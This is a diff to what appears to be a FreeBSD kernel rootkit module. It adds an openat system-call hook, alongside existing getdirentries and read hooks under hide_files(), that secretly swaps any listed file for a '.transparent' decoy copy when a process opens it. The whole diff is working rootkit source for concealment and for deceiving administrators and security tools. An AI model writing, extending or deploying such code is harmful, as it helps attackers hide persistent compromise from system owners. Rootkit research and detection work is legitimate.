@@ -434,11 +434,107 @@ read_hook(struct thread *td, void *syscall_args)
 	return(ret_sys);
 }
 
+static int
+is_transparent_file(char *path)
+{
+	int i;
+
+	for (i = 0; i < NUM_TRANSPARENT_FILES; i++)
+	{
+		if (strcmp(path, transparent_files[i]) == 0)
+		{
+			return(1);
+		}
+
+	}
+
+	return(0);
+}
+
+static char *
+generate_transparent_path(char *path)
+{
+	int len;
+
+	char *ext;
+	char *filepath;
+
+	ext = ".transparent";
+	len = strlen(path) + strlen(ext) + 1;
+	filepath = malloc(len, M_TEMP, M_WAITOK);
+
+	strcpy(filepath, path);
+	strcat(filepath, ext);
+	return(filepath);
+}
+
+static int
+openat_hook(struct thread *td, void *syscall_args)
+{
+	int ret;
+	int sys_ret;
+	int fd;
+
+	char *filepath;
+	char *freebuf;
+	char *transparent_path;
+
+	struct openat_args *uap;
+	struct close_args uap_close;
+
+	uap = (struct openat_args *) syscall_args;
+
+	sys_ret = sys_openat(td, syscall_args);
+	fd = td->td_retval[0];
+
+	if (fd < 0)
+	{
+		return(sys_ret);
+	}
+
+	ret = generate_path_from_fd(td, fd, &filepath, &freebuf);
+	if (ret)
+	{
+		return(sys_ret);
+	}
+
+	if (is_transparent_file(filepath))
+	{
+		/* Close file.
+		 * Open a different file.
+		 * Return that. */
+		uap_close.fd = fd;
+		ret = sys_close(td, &uap_close);
+		if (ret)
+		{
+			free(freebuf, M_TEMP);
+			return(sys_ret);
+		}
+
+		transparent_path = generate_transparent_path(filepath);
+		ret = kern_openat(td, uap->fd, transparent_path, UIO_SYSSPACE,
+				uap->flag, uap->mode);
+
+		free(transparent_path, M_TEMP);
+		free(freebuf, M_TEMP);
+
+		if (ret)
+		{
+			return(sys_ret);
+		}
+
+		return(ret);
+	}
+
+	return(sys_ret);
+}
+
 void
 hide_files(void)
 {
 	hook_syscall_set(SYS_getdirentries, getdirentries_hook);
 	hook_syscall_set(SYS_read, read_hook);
+	hook_syscall_set(SYS_openat, openat_hook);
 }
 
 void
@@ -446,4 +542,5 @@ unhide_files(void)
 {
 	hook_syscall_set(SYS_getdirentries, sys_getdirentries);
 	hook_syscall_set(SYS_read, sys_read);
+	hook_syscall_set(SYS_openat, sys_openat);
 }
